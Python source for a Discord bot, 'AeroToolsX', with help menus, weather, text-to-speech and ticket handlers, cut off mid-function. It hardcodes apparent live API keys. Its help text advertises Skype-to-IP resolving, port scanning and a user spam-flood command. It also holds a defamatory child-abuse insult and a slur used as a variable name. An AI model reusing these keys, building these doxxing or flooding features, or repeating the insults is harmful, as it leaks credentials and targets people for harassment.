from datetime import datetime
from log import *
from downloading_files import utils
import pytesseract
from uid_gen import hashes
from time import sleep
import eventlet
import json
import urllib.parse
import urllib.request
from pastebin import PastebinAPI
import requests, time, subprocess, sys, platform, hashlib, json, signal, glob, argparse
from os import remove, rename, system
import os.path
import discord.ext.commands
import discord
from subprocess import PIPE, run
from random import randint, choice    
from gtts import gTTS
from PIL import Image, ImageFilter, ImageFont, ImageDraw, ImageEnhance
from io import StringIO, BytesIO
import io
from blacklist import blacklist
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
import socket

    
DEVELOPER_KEY = 'AIzaSyC93cNEdryG9cfD_K0mMoJLI0jEZyxibQ0'
YOUTUBE_API_SERVICE_NAME = 'youtube'
YOUTUBE_API_VERSION = 'v3'
max_res = 25
#   WELCOME TO MY BIG AZZ DISCORD-BOAT
# http://free-proxy-list.net/ < Use Later
#####################      Twilio api key goes below
t_key = "dbd726df4beeac82be8c210f5b216ea9"
#####################
admin_file = "aero-data/aero_admins.txt"
log_file = "aero-data/log.txt"
my_ids = []
count = 0
bot_count = 0
not_null = " "
application_chan = 633657718288285726
logging_channel = 633657639548616704

def convert_html(string):
    string = string.replace('&quot;', '"').replace("amp;", "").replace("&#39;", "'")
    return string

   
#
# username should always be root / change ip to your remote servers ip at.
#
#class database:
#    connection = sqlite3.connect('db/AeroTools Version-X.db')
#    self = connection.cursor()

################### IMAGE #################################


def get_random_font():
    fonts = ['Aero.ttf',
             'Demonized.ttf',
             'BTTF.ttf',
             'Transformers_Movie.ttf',
             'Elite_Hacker.ttf']
    this = choice(fonts)
    return this
        



class strings:
    xmas_gif = "https://cdn.discordapp.com/attachments/632637195399725089/654445680969908225/aerotools_xmas_2019_2020.gif"
    main_thumbnail = "https://cdn.discordapp.com/attachments/635539301790384171/651238160982081536/aerotools_2020.gif"
    abc = [
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z'
        ]
    null_ = ""
    strip_1=str("""   
    IS VALID?: """)
    strip_2=str("""

    NUMBER: """)
    strip_3=str("""

    LOCAL FORMAT: """)
    strip_4=str("""

    INTERNATIONAL FORMAT: """)
    strip_5=str("""

    COUNTRY (PRFX): """)
    strip_6=str("""

    COUNTRY CODE: """)
    strip_7=str("""

    COUNTRY NAME: """)
    strip_8=str("""

    LOCATION: """)
    strip_9=str("""

    LINE TYPE: """)
    strip_10=str("""

    CARRIER: """)
    strip_11=str("""
    
>>>: """)
    def admin_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Moderation", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**Mod Tools**__", value="""
    `at.kick <@VALID_Mention> <Optional: reason>` - Kicks User - Requires Perms.
    `at.ban <@VALID_Mention> <Optional: reason>` - Bans User - Requires Perms.
    `at.unban <USER_ID> <Optional: reason>` - Unbans User - Requires Perms.
    `at.user_log <@VALID_Mention>` - Get Users Message Log(.txt). - Requires Perms.
    `at.prune <amount>` Deletes a set-amount of messages - Requires Perms. 
    """, inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed    


    
    def code_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Code/Text Tools", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**Pastebin**__", value="""
    `at.pastebin <your paste>` - Paste Text To Our Public Bin.
    `at.anonpaste <your paste>` - Paste As Guest On Pastebin.
    `at.our_pastes` - Show All Pastes From AeroTools Users!
    """, inline=False)
        
        embed.add_field(name="__**File Editor**__", value="""
    `at.code <Lang/format> <Contents>` - Create a formatted file!

Usage:
```at.code python
for _ in range(0, 5):
    print('Hello World!')
```
    """, inline=False)
                
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed


    def info_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Information", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**Info Tools:**__", value="""
    `at.bot.info` - Get Bot's info.
    `at.server.info` - Gets Server's Info.
    `at.pfp <@USER>` - Gets User's Profile Avatar.
    `at.user.info @USER` - Get Some User-Info Of A Profile.
    `at.uptime` - Get Our Current System Health/Info.
    `at.invite` - Gets Link To AeroTools On Discord Bots List. 
    """, inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed

    def image_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Image Help", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**PFP:**__", value="""
    `at.pfp <@user>` - Sends Back A Users Avatar.
    `at.emojify <@user>` - Sends Back An Emoji Formatted Avatar.
    `at.cartoonify <@user>` - Sends Back A Cartoon Version Of User's Avatar.
    `at.brand <@user>` - Sends Back Branded Version Of User's Avatar.
    """, inline=False)
        
        embed.add_field(name="__**Other:**__", value="""
    `at.text <text>` - Creates a random Discord Button(PNG) of your text.
    `at.img2text <URL To Image>` - ATTEMPTS to find text in an image.
    `at.img2data <URL To Image>` - Gets ALL image data [multiple replies]
    """, inline=False)             

        embed.add_field(name="__**Overlay Tools:**__", value="""
    `at.overlay <Overlay> <@User or Link To Image>` - Make Custom Images :)
    `at.custom_overlay <Any Link or @User> <Any Link or @User>` - Make Truly-Custom Images!!
    """, inline=False)

        embed.add_field(name="__**Overlays:**__", value="""
```
-Characters:
batman, tucker_carlson, hacker, pepe_cheers, no_trollface, genius, npc
knuckles, datboi, yoinked_catto, thiccboi

-Art:
arrow, blue_fire, blue_swipe, red_smoke, boom, clouds, color_smoke1,
galazy, genesis, ice, jungle, lightning, lips, lips2, money, purple_twilight
twitch, gold_smoke

-Animals:
trout, fly, crow

-Clout:
money, supreme_alien, supreme_full, supreme_goggles, supreme_hollow
supreme_lazer, supreme_spooktober, louis_v, twitch, youtube

-Funny:
beard, kermit_horror, overjoy_emote, brokest_countries, not_bad
fu, ded

-NSFWish:
hot_bod, hot_bod1, hot_bod2, hot_bod3, hot_bod4, hot_bod5, hot_bod6
booty, booty1

-Other:
droplets, galaxy, genesis, water, jungle, ice, lightening, lips, lips2
mad_emote, plane, rose, explosion, evilcorp, linux
```
    """, inline=True)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed

    def fun_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Fun Help", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**Fun:**__", value="""
    `at.hello` - Say Hello, Sends A Reply:)
    `at.tts <message>` - Converts Your Text-To-Speech(mp3).
    """, inline=False)
        embed.add_field(name="__**Funny:**__", value="""
    `at.meme` - Send Meme
    `at.insult` or `at.destroy <@user>` - Insult Another User
    `at.lmgtfy <search>` - Sends Back lmgtfy.com Search Link
    `at.fortune` - Sends Random Fortune Cookie
    """, inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed
    
    def utils_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="General Utilities Help", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        
        embed.add_field(name="__**General Tools:**__", value="""
    `at.curr2btc` or `at.money2btc` or `convert.btc <SYM> <amount>`.
    `at.math 6 * 6` or `at.math 6 / 6` or `at.math 6 + 6` or `at.math 6 - 6`
    `at.smart_phrase` - Generates A Perfectly Executed Statement.
    `at.ascii <your text here>` - Creates ASCII Art With Your Text.
    `at.img2text <URL To Image>` - ATTEMPTS to find text in an image.
    `at.img2data <URL To Image>` - Gets ALL image data [multiple replies]
    `at.readme <URL To Speech>` - Reads you text from an image. (mp3)
    """, inline=False)
        
        embed.add_field(name="__**YouTube Tools:**__", value="""
    `at.searchyoutube <Your Search Query>` - Returns Videos, Channels & Playlists Related Your Search Query!
    """, inline=False)             #`at.youtube2mp3 <YouTube Video URL>` - Downloads audio(.MP3) Of YouTube Video!
        #`at.dlyoutube <YouTube Video URL>` - Downloads .MP4 Of YouTube Video!

        embed.add_field(name="__**Weather Search:**__", value="""
    `at.weather <CITY,COUNTRY_CODE>` -Weather Results Related Your Search Query!
    """, inline=False)
        
        embed.add_field(name="__**Support Ticket:**__", value="""
    `at.ticket <message>`
    
    """, inline=True)
        embed.add_field(name="__**Example:**__", value="""
```css
at.ticket
I need halp pls!
I had cookie but
cookie gone!
```
    """, inline=True)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed    


    
    def resolver_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Resolver Help", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**Resolvers:**__", value="""
    `at.phonelookup <18006666666>` - Gets Carrier + Location.
    `at.resolve.skype <skype-user>` - Get IP form Skype account.
    `at.ip.skype <IP>` or `at.ip2skype` <IP> - Compare Skype Id to IP db.
    `at.cloudflare.resolve <Url>` - Resolves Cloudflare addresses.
    """, inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed

    def games_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Games Help", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**SpamWarz[MegaPing]**__", value="""
    `at.spam <@user>` - Send A Flood Of Spam To a User.
    `at.addme.blacklist` - Add Yourself To Spammer Blacklist.
    `at.is.blacklist <@user>` - Check If User's In Spammer Blacklist.
    [Use Responsibly!]
    """, inline=False)
        embed.add_field(name="__**Other**__", value="""
    `Adding More Soon!`
    """, inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed

    
    def network_tools(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Network Help", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**Domain**__", value="""
`at.spider <Domain>` - Spider Domain For Alt Hosts
`at.scrape <URL>` - Scrape URL HTTP Headers
`at.isitup <Domain>` - Check If Domain Is Up [Broken]
`at.whois <Domain>` - Get Owner Info On A Domain
`at.dns <Domain>` - Get DNS Query On A Domain
""", inline=False)
        embed.add_field(name="__**Host**__", value="""
`at.ping <Host>` - Pings Host
`at.lookup <Host>` - Lookup Host
`at.scan <Host>` - Portscan Host
`at.traceroute <Host>` - Traceroute To Host
""", inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed

    
    def gaming_network_help(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Gaming Network Help", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960")
        embed.add_field(name="__**Fortnite:**__", value="""
    `at.fortnite.stats <Platform> <Epic ID>` - Gets Players Stats! | Platforms: `pc, xb1, psn, and`
    """, inline=False)
        embed.add_field(name="__**Other:**__", value="""
    `Coming Soon!`
    """, inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        return embed


    def help_text(message):
        embed = discord.Embed(title=f"__AeroToolsX__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Help Commands", url='https://host-info.net/',
                         icon_url='https://media.discordapp.net/attachments/632694453278212119/640624612237115392/kgtjyzxpq2n21.jpg?width=1280&height=960')

        embed.set_thumbnail(url=strings.main_thumbnail)

        embed.add_field(name=":information_source:__**Help:**__", value="""
`at.help`\n[!Hover For Info](Gets these help commands. Use at.channel.help to send in channel.)
""", inline=True)
        
        embed.add_field(name=":globe_with_meridians:__**Network:**__", value="""
`at.network`\n[!Hover For Info](GeoIP-Lookup, Portscan and more!)
""", inline=True)

        embed.add_field(name=" :mag_right:__**Resolver:**__", value="""
`at.resolver`\n[Hover For Info](Resolve user info from phone numbers and other platforms.)
""", inline=True)
        
        embed.add_field(name=":shield:__**Moderation:**__", value="""
`at.admin`\n[Hover For Info](Our featured moderation commands.)
""", inline=True)

        embed.add_field(name=":briefcase:__**Utilities:**__", value="""
`at.tools`\n[Hover For Info](A general selection of useful tools.)
""", inline=True)        

        embed.add_field(name=":camera_with_flash:__**Image Tools:**__", value="""
`at.image`\n[Hover For Info](AeroTools has TONS of image manipulation skills, check them out here!)
""", inline=True)

        embed.add_field(name=":gem:__**Funny:**__", value="""
`at.fun`\n[Hover For Info](Some funny commands to brighten up your day!)
""", inline=True)        
        
        embed.add_field(name=":video_game:__**Gaming:**__", value="""
`at.gaming`\n[Hover For Info](Game news, info & tracking.)
""", inline=True)
        
        embed.add_field(name=":microscope:__**Information:**__", value="""
`at.info`\n[Hover For Info](Discord information tools. Know as much as legally possible about your Discord surroundings.)
""", inline=True)

        embed.add_field(name=":space_invader:__**Games:**__", value="""
`at.games`\n[Hover For Info](Our featured bot games!)
""", inline=True)
        
        embed.add_field(name=":scroll:__**Code/Text:**__", value="""
`at.programming`\n[Hover For Info](Some useful tools for programmers/writers!)
""", inline=True)


        embed.add_field(name=":star2:__**Premium:**__", value="""
`at.premium`\n[Hover For Info](Coming 2020!)
""", inline=True)

        embed.add_field(name=":loudspeaker:__**Updates:**__", value="""
`at.updates`\n[Hover For Info](Today's update log.)
""", inline=True)
        
        embed.add_field(name=":information_desk_person:__**Ticket:**__", value="""
`at.ticket`\n[Hover For Info](Create a support ticket for help/suggestions.)
""", inline=True)

        embed.add_field(name=":name_badge:__**AutoMod:**__", value="""
`Coming Soon!`\n[Hover For Info](Coming 2020!)
""", inline=True)
        embed.set_image(url = strings.xmas_gif)
        embed.add_field(name="""`---------------------------------------------`""", value=f"""[:door:**__Invite__**](https://top.gg/bot/635527435139678228)"""
                        """ **|** [:desktop:**__Website__**](https://host-info.net/)"""
                        " **|** [:reminder_ribbon:**__Support__**](https://discord.gg/RbMRpN2)"
                        " **|** [:handshake:**__Donate__**](https://paypal.me/cybercreaturesec)", inline=True)

        embed.set_footer(text=f"Happy Holidays From Host-Info.net!\nRequested By {message.author} in #{message.channel}.")
        return embed


########################################################################################################

def make_mp3_2(string):
    tts = gTTS(string)
    uid = str(randint(1111, 9999))
    fname = f"tts_{uid}.mp3"
    failed = False
    try:
        tts.save(f"tts/{fname}")
        fname = f"tts/tts_{uid}.mp3"
    except Exception as efds:
        log.log(str(efds))
        try:
            tts.save(fname)
        except Exception as efda:
            log.log(str(f"Failed To Find Dir: 'tts/'!\n\n Make It! \n{efda}"))
            failed = True
        if failed != False and os.path.exists(fname) != True:
            thing = None
        else:
            thing = fname
            
        return thing


def make_mp3(name, string):
    tts = gTTS(f"{name} says {string}")
    uid = str(randint(1111, 9999))
    fname = f"tts_{uid}.mp3"
    failed = False
    try:
        tts.save(f"tts/{fname}")
        fname = f"tts/tts_{uid}.mp3"
    except Exception as efds:
        log.log(str(efds))
        try:
            tts.save(fname)
        except Exception as efda:
            log.log(str(f"Failed To Find Dir: 'tts/'!\n\n Make It! \n{efda}"))
            failed = True
        if failed != False and os.path.exists(fname) != True:
            thing = None
        else:
            thing = fname
            
        return thing
            
    
        
    
def is_admin(idd):
    #BOOL
    admin = False
    listed = [line.rstrip('\n') for line in open(admin_file)]
    if str(idd) in listed:
        admin = True
    return admin   

def is_admin_public(idd, guild_id):
    #BOOL
    admin = False
    listed = [line.rstrip('\n') for line in open(f"admin_db_{str(guild_id)}.db","r")]
    if str(idd) in listed:
        admin = True
    return admin   

def add_admin_public(author_id, add_id, guild_id, guild_owner_id):
    #INT
    if author_id == guild_owner_id:
        done = False
        try:
            prime = open(f"public_admin_database/aero-data/admin_db_{str(guild_id)}.db", "w+")
            prime.close()
        except Exception as fdss:
            log.log(str(fdss))
            return
        try:
            with open(f"public_admin_database/aero-data/admin_db_{str(guild_id)}.db","a+") as admins:
                admins.write(f"\n{str(add_id)}")
                done = True
        except Exception as fdsa:
            log.log(str(fdsa))
        if done == True: return 0
        else: return 1



class weather:
    def check_weather(message):
        cont = True
        payload = str()
        thing = str()
        try:
            test = message.content.split()[1]
            query = message.content.replace(f"{message.content.split()[0]} ", "")

            if len(query.split()) > 6:
                cont = False
            if len(query.split()) < 1:
                cont = False
                
        except:
            query = "None"
            cont = False
            embed = discord.Embed(title=f"AeroTools Version-X",description=" ", url='https://aero-bot.pro/', color=0x8000ff)
            embed.set_author(name=f"Weather Search", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/635539301790384171/641174214019252224/weather.png")
            embed.add_field(name=f"__**Weather Results:**__", value=f"""
    :thinking:**No Search Query Provided...**:recycle:
    """, inline=False)
            embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
            thing = embed        

        if cont == True:
            try:
                city = query.split(",")[0];country = query.split(",")[1];payload = f"?q={city},{country}"
                q = f"http://api.openweathermap.org/data/2.5/weather{payload}&APPID=de19b2e980991718678eb6965f90bc87&units=imperial"
                do_sex = requests.get(q);data = do_sex.json()
                weather = dict(data['weather'][0]);sys = dict(data['sys']);vis = data['visibility'];time_zone = data['timezone'];wind = dict(data['wind']);main = dict(data['main'])
                main_state = weather.get("main", "");description = weather.get("description", "");name = data['name'];sunset = sys.get("sunset", "")
                sunset = sys.get("sunrise", "");country = sys.get("country", "");oof = str(datetime.now().strftime('%Y-%m-%d %H:%M:'))
                temp = main.get("temp", "");temp_min = main.get("temp_min", "");temp_max = main.get("temp_max", "");pressure = main.get("pressure", "")
                humidity = str(main.get("humidity", ""));speed = wind.get("speed", "");degree = wind.get("degree", "")
                embed = discord.Embed(title=f"AeroTools Version-X",description=" ", url='https://aero-bot.pro/', color=0x8000ff)
                embed.set_author(name=f"Weather Search", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/635539301790384171/641174214019252224/weather.png")
                embed.add_field(name=f"__**Weather Results For {name}, {country}:**__", value=f"""
    __General:__
    `{main_state}` - `{description}`
    __Temperature:__
    `{temp}`℉
    __Hi's/Low's:__
    Low of `{temp_min}`℉ / High of `{temp_max}`℉
    __Humidity:__
    `{humidity}`%
    __Wind Speed:__
    `{speed}`MPH
    __Wind Temp:__
    `{temp}`℉
    __Atmospheric Pressure:__
    `{pressure}`Hg
    __Timezone:__
    `{time_zone}`
    __Visibility:__
    `{vis}`ft
    """, inline=False)
            
                embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
                thing = embed
            except:
                embed = discord.Embed(title=f"AeroTools Version-X",description=" ", url='https://aero-bot.pro/', color=0x8000ff)
                embed.set_author(name=f"Weather Search", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/635539301790384171/641174214019252224/weather.png")
                embed.add_field(name=f"__**Weather Results:**__", value=f"""
        :frowning:**Failed To Find Any Results For `{query}`...**:frowning2:
        """, inline=False)
                embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
                thing = embed
            
        return thing
            
    
class insults:
    aa = "**Lol,** ";ab = " **is as useless as a traffic light in GTA.**"
    ba = "";bb = " **has 500gigs of child porn @ BitchUgotDestroyed.onion! Ping The IC!!!**"
    ca = "**Hey**";cb = ", **you've got something on your Chin...No, the 3rd one down..**"
    da = "";db = " **is the main reason the gene pool needs a lifeguard..**"
    ea = "";eb = "! **Lol really??? This ones too easy...**"
    
class lists:
    useragents = [
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/57.0.2987.110 '
     'Safari/537.36'),  # chrome
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/61.0.3163.79 '
     'Safari/537.36'),  # chrome
    ('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) '
     'Gecko/20100101 '
     'Firefox/55.0'),  # firefox
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/61.0.3163.91 '
     'Safari/537.36'),  # chrome
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/62.0.3202.89 '
     'Safari/537.36'),  # chrome
    ('Mozilla/5.0 (X11; Linux x86_64) '
     'AppleWebKit/537.36 (KHTML, like Gecko) '
     'Chrome/63.0.3239.108 '
     'Safari/537.36'),  # chrome
    ]

class music:
    class favorites:
        a = "https://soundcloud.com/itsgladez/gladez-favela";b = "https://soundcloud.com/reaperdubstep/reaper-buried-feat-micah-byrnesbuy-for-free-dl";c = "https://soundcloud.com/misogi/lunar";d = "https://soundcloud.com/tisoki-treats/heartbroken";e = "https://soundcloud.com/bighitterburt/outcast"
        f = "https://soundcloud.com/andem01/getter-colorblind";g = "https://soundcloud.com/warnedstep/shadowcloneanthemvip";h = "*https://soundcloud.com/christravis/chris-travis-beam"
        i = "https://soundcloud.com/bitbird/taska-black-where-we-go";j = "https://soundcloud.com/convolk/swan-dive";k = "https://soundcloud.com/comethazine/findhim"
    class country:
        a = "https://soundcloud.com/drugstorecowboy-1/coward-of-the-county-kenny?in=user-410239506/sets/country-music-2019"
        b = "https://soundcloud.com/sugar-hill-records/talk-is-cheap-1?in=user-410239506/sets/country-music-2019"
        c = "https://soundcloud.com/marshmellomusic/one-thing-right-feat-kane?in=diehansa/sets/country-songs"
        d = "https://soundcloud.com/danandshay/all-to-myself?in=diehansa/sets/country-songs"
        e = "https://soundcloud.com/keith_urban/we-were?in=diehansa/sets/country-songs"
        f = "https://soundcloud.com/blakeshelton/boys-round-here-feat-pistol-annies?in=pam-robinson-338577353/sets/mixed-country"
        g = "https://soundcloud.com/thecollectivesounds/aaron-lewis-country-boy"
        h = "https://soundcloud.com/cole-swindell/middle-of-a-memory?in=pam-robinson-338577353/sets/cole-swindell"
        i = "https://soundcloud.com/blakeshelton/kiss-my-country-ass-2"
        j = "https://soundcloud.com/chris-janson-official/buy-me-a-boat?in=pam-robinson-338577353/sets/chris-jansen"
        k = "https://soundcloud.com/jon-pardi-music/heartache-on-the-dance-floor?in=pam-robinson-338577353/sets/jon-pardimusic"
    class rap_hip_hop:
        a = "https://soundcloud.com/rapsc/ybn-nahmir-opp-stoppa"
        b = "https://soundcloud.com/hip-hop/strybo-plan-feat-latro"
        c = "https://soundcloud.com/gxx/gxx-run-my-faxe"
        d = "https://soundcloud.com/bigsean-1/overtime"
        e = "https://soundcloud.com/migosatl/slippery-feat-gucci-mane"
        f = "https://soundcloud.com/lilpump/lil-pump-gucci-gang-prod-bighead-gnealz"
        g = "https://soundcloud.com/ybncordae/we-gon-make-it-feat-meek-mill"
        h = "https://soundcloud.com/comethazine/findhim"
        i = "https://soundcloud.com/secret-service-862007284/old-town-road"
        j = "https://soundcloud.com/chancetherapper/slide-around"
        k = "https://soundcloud.com/trapgod1017bricksquad/gucci-mane-both-ft-drake-1"
        l = "https://soundcloud.com/brokenheartedhours/shiloh-dynasty-downtown-prod-mikaro2k14-not-mine"
        m = "https://soundcloud.com/user-207375672/ski-mask-the-slump-god-babywipe-lofi-version"
        n = "https://soundcloud.com/ambjaay/uno"
        o = "https://soundcloud.com/nlechoppa/shotta-flow-3?in=soundcloud-hustle/sets/rap-new-hot"
    class rock:
        a = "https://soundcloud.com/atlanticrecords/skillet-rise?in=user-919362863/sets/rock"
        b = "https://soundcloud.com/roadrunner-usa/nickelback-how-you-remind-me?in=user-730670180/sets/rock"
        c = "https://soundcloud.com/patrick-drummer/system-of-a-down-chop-suey?in=vargas-jose-annabelle/sets/rock"
        d = "https://soundcloud.com/jhon-agudelo-1/slipknot-before-i-forget"
        e = "https://soundcloud.com/officialmetallica/metallica-master-of-puppets?in=francisco-segovia-564442040/sets/rock"
        f = "https://soundcloud.com/blink-182/i-miss-you-album-version"
        g = "https://soundcloud.com/red-hot-chili-peppers-official/californication"
        h = "https://soundcloud.com/red-hot-chili-peppers-official/californication"
        i = "https://soundcloud.com/victoryrecords/dead-girls-academy-ill-find-a-way"
        j = "https://soundcloud.com/xx-reika-xx/30-second-to-mars-the-kill"
        k = "https://soundcloud.com/victoryrecords"
              

class application:
    def make(message, author):
        try:
            nig = str(author);ran=str(randint(1000, 9999));content = str(message.replace("apply",'').replace("at.apply",'').replace("!apply",''));t_d=str(datetime.now())
            log.log(f"\n----------------------\n[{t_d}] - [TICKET: {ran}]\nTicket From {nig}\nBODY:\n{content}\n----------------------\n")
            f=open(f"aero-data/applications.txt","a");stuff = str(f"\n[{t_d}] - [APPLICATION: {ran}]\nApplication From {nig}\n------------------------\nBODY:\n{content}\n----------------------------\n");f.write(stuff);f.close()
            result = str(f"**Thank You For Submitting An Application, {nig}!\nYour Inquiry Has Been Received, Someone Will Review It And An Admin/Owner Will Get Back To You Shortly!**\n\n```css\nClient ID: {nig}\nTicket Number: {ran}\n```\n\n**We Value Your Application <3**")
        except Exception as lkjf:
            log.log(str(lkjf))
        return result
    
class ticket:
    def make(message, author):
        try:
            nig = str(author);ran=str(randint(1000, 9999));content = str(message);t_d=str(datetime.now())
            log.log(f"\n----------------------\n[{t_d}] - [TICKET: {ran}]\nTicket From {nig}\nBODY:\n{content}\n----------------------\n")
            f=open(f"aero-data/tickets.txt","a+");stuff = str(f"\n[{t_d}] - [TICKET: {ran}]\nTicket From {nig}\n------------------------\nBODY:\n{content}\n----------------------------\n");f.write(stuff);f.close()
            result = str(f"**Thank You For Submitting Your Ticket Correctly, {nig}!\nYour Ticket Has Been Received, Someone Will Review It And Get Back To You Shortly!**\n\n```css\nClient ID: {nig}\nTicket Number: {ran}\n```\n\n**We Value Your Input <3**")
        except Exception as ajfk:
            log.log(str(ajfk))
        return result



#class md5:
#    def make_hash(self, thing):
#        thing = str(thing)
#        result = hashlib.md5(thing.encode())
#        return str(result.hexdigest()) 
#  
#        
#class hexx:
#    def decode(self, hexx):
#        hexx = str(hexx)
#        this = str(hexx.decode("hex"))
#        return this
#    
#    def encode(self, stringg):
#        string = str(stringg)
#        this = str(string.hex())
#        return this
        
        
    
    
    
class languages:
    def get_extension(stuff):
        if stuff == "php":
            extension = "php"
        if stuff == "html":
            extension = "html"
        if stuff =="python":
            extension = "py"
        if stuff == "python":
            extension = "py"
        if stuff == "javascript":
            extension = "js"
        if stuff == "c":
            extension = "c"
        if stuff == "c++":
            extension = "cpp"
        if stuff == "cpp":
            extension = "cpp"    
        if stuff == "perl":
            extension = "pl"
        if stuff == "css":
            extension = "css"
        if stuff == "text":
            extension = "txt"
        if stuff == "batch":
            extension = "bat"
        if stuff == "null":
            extension = ""
        return extension
    
    
class ide:
    def format(message, author):
        erro = False
        try:
            lang = message.split()[1]
        except Exception:
            erro = True
        if erro == False:
            ext = str(languages.get_extension(lang))
            filename = str(f"AeroFilecode{lang}.{ext}")
            file = open(filename, "w+")
            body = message.replace(f'{message.split()[0]} {message.split()[1]} ', "")
            file.write(f"\n{body}\n")
            file.close()
        if erro == True:
